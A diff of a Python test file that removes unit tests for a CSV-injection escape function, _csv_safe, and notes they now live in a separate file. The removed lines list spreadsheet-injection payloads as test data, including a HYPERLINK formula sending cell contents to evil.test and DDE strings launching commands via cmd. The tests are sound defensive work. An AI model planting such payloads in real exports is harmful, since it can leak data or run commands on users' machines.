@@ -477,52 +477,10 @@ def test_csv_rejects_out_of_bounds_days(db) -> None:
 
 # ── CSV injection ────────────────────────────────────────────────────────────
 #
-# Two layers, deliberately: the escape itself is unit-tested against the whole
-# OWASP trigger list, and the endpoint tests prove the escape is actually wired
-# into the response a customer downloads.
-
-
-@pytest.mark.parametrize(
-    ("payload", "why"),
-    [
-        ('=HYPERLINK("https://evil.test/?"&A1,"Click")', "formula"),
-        ('+cmd|" /C calc"!A0', "signed expression / DDE"),
-        ('-2+3+cmd|" /C calc"!A0', "signed expression / DDE"),
-        ("@SUM(1+1)*cmd|' /C calc'!A0", "legacy Lotus-style formula"),
-        # Excel strips a leading TAB/CR before deciding whether the cell is a
-        # formula, so a check that only looks for "=" misses these two.
-        ("\t=1+1", "TAB-prefixed formula"),
-        ("\r=1+1", "CR-prefixed formula"),
-    ],
-)
-def test_csv_safe_neutralises_every_formula_trigger(payload: str, why: str) -> None:
-    from app.api.analytics_routes import _csv_safe
-
-    escaped = _csv_safe(payload)
-    # The defence: a leading single quote, so the spreadsheet reads the rest of
-    # the cell as literal text rather than as an expression.
-    assert escaped == f"'{payload}", why
-    assert not escaped.startswith(("=", "+", "-", "@", "\t", "\r")), why
-    # Nothing is silently dropped — the name stays fully recoverable.
-    assert escaped[1:] == payload, why
-
-
-@pytest.mark.parametrize(
-    "value",
-    ["Acme Support", 'Acme, Inc. "Main"', "", "Café ☕", "2026 Bot"],
-)
-def test_csv_safe_leaves_an_ordinary_name_alone(value: str) -> None:
-    """The escape is targeted — commas and quotes are the writer's job, not its."""
-    from app.api.analytics_routes import _csv_safe
-
-    assert _csv_safe(value) == value
-
-
-def test_csv_safe_tolerates_a_missing_name() -> None:
-    """``Bot.name`` is nullable in the schema; an export must not crash on it."""
-    from app.api.analytics_routes import _csv_safe
-
-    assert _csv_safe(None) == ""
+# Two layers, deliberately. The escape itself is unit-tested against the whole
+# OWASP trigger list in ``test_csv_safety.py`` (DB-free, so it runs everywhere);
+# the tests below prove the escape is actually wired into the response a
+# customer downloads, which is the half that a refactor can quietly break.
 
 
 @pytest.mark.parametrize(
